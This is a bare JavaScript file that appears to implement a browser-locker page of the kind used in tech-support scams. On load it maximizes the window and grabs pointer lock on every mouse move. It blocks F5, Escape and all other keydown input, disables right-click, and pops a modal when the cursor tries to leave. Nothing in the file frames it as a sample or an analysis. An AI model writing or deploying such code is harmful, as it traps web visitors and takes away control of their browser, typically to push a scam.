
function addEvent(obj, evt, fn) {
		if (obj.addEventListener) {
				obj.addEventListener(evt, fn, false);
		}
		else if (obj.attachEvent) {
				obj.attachEvent("on" + evt, fn);
		}
}
addEvent(window,"load",function(e) {
		addEvent(document, "mouseout", function(e) {
				e = e ? e : window.event;
				var from = e.relatedTarget || e.toElement;
				if (!from || from.nodeName == "HTML") {
						// stop your drag event here
						// for now we can just use an alert
				 //alert("hello");

			 modal.style.display = "block";

				}
		});
});

	$(document).mousemove(function(){
	var canvas = document.getElementById('mycanvas');
canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
canvas.requestPointerLock();

	//capture mouse movement event
		 // remove our layover from the DOM
	});

 //  $(document).mousemove(function(){
 // alert("move detect");
	//capture mouse movement event
 //   $("#pageLayover").remove(); // remove our layover from the DOM
 // });



 
document.attachEvent("onkeydown", win_onkeydown_handler);

function win_onkeydown_handler() {
  switch (event.keyCode) {
    case 116:
      event.returnValue = !1;
      event.keyCode = 0;
      break;
    case 27:
      event.returnValue = !1, event.keyCode = 0
  }
}


window.onload = function() {
          window.moveTo(0, 0);
          window.resizeTo(screen.availWidth, screen.availHeight)
        };
     

        document.onkeydown = function(a) {
            return !1
          };

          
          var isNS = "Netscape" == navigator.appName ? 1 : 0;
          "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
  
          function mischandler() {
            return !1
          }
  
          function mousehandler(a) {
            a = isNS ? a : event;
            a = isNS ? a.which : a.button;
            if (2 == a || 3 == a) return !1
          }
          document.oncontextmenu = mischandler;
          document.onmousedown = mousehandler;
          document.onmouseup = mousehandler;